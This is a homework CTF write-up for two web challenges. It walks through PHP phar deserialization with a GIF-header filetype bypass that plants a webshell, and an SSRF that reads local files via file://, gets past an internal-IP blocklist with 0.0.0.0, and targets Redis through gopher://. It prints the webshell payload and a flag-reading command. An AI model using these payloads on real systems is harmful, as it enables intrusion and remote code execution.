# HW0x05 writeup

## Rero Meme
> FLAG{レロレロ?RERO!レロレロ,RERO?レロレロ~}

1. observe the problem
   - *4 functions* that are able to trigger **phar deserialization vulnerability**
     - `file_get_contents` in <u>index.php</u>
     - `is_dir, mkdir` in <u>lib.php</u>, `class User`
     - `file_put_contents` in <u>lib.php</u>, `class Meme`
   - In order too trigger such vulnerability, the parameter need to be under control.
   - Therefore, only `is_dir, mkdir` can be controlled using *username* with initial, `phar://`.
2. restriction for uploading files
   - In `index.php`, the uploaded file is required to be *GIF* to continue.
3. construct *.phar* file
   - bypass filetype check
     - since *phar* only require that it ended with `__HALT_COMPILER(); ?>`, use magic header, `GIF89a`, to bypass.
   - ***webshell***
     - magic function, `__destruct`, will be called when deserialize
     - make use of `file_put_contents($this->filename, $this->content);` to put a **php webshell** to the file.
     - Therefore, new a `Meme` with content, `"<?php eval(system(\$_GET['cmd']));?>"`, and change its `$this->filename` after construction.
4. generate the *phar* file and change its extension to *.gif*
5. upload the *gif* with `$username` and `$title`
6. clear cookies and login with another username, `phar://$username/$title.gif`
7. use the created web shell to get the flag with `cmd=cat /flag_b3I10KyNv9`

## 陸拾肆基底編碼之遠端圖像編碼器

1. use post request to `http://base64image.splitline.tw:8894/?page=result` with `url=file://{filename}` to get the content of files
   - the content of the file will be placed in the *img tag* with base 64 encoded
2. get important *src code*
   - `index.php`, `url=file:///var/www/html/index.php`
     - **Hint**: find the other service on *this* server
   - `result.inc.php`, `url=file:///var/www/html/page/result.inc.php`
     - check if `url` contain `['192', '172', '10', '127']` -> Internal IP being banned
3. find other service
   - unable to read `/etc/services`
   - read `/proc/net/tcp`
      ```
        sl  local_address rem_address   st tx_queue rx_queue tr tm->when retrnsmt   uid  timeout inode                                                     
        0: 0B00007F:91BB 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 17395422 1 00000000e620e9ee 99 0 0 10 0                   
        1: 0100007F:69FE 00000000:0000 0A 00000000:00000000 00:00000000 00000000   101        0 17459576 1 00000000caa428d1 99 0 0 10 0
        ......
      ```
      parse and get
      ```
        127.0.0.11  37307	0.0.0.0	0
        127.0.0.1   27134	0.0.0.0	0
        ......
      ```
      Find service at port `27134` and, instead of `127.0.0.1`, use `0.0.0.0` to access.
4. `url=http://0.0.0.0:27134`
   - receive response, `- ERR wrong number of arguments for 'get' command`
   - google and find that it is **Redis Service**
5. use `gopher://` to communicate and write a **phpshell**
   - attempt to write **phpshell** under `/var/www/html`, but found that not enough authority
   - try all the folders under `/`, and find that we can write file under `/tmp`
   - **NOT completed** write `"<?php eval(system(\$_GET['cmd']));?>"` to file under `/tmp`
6. use the created web shell to get the flag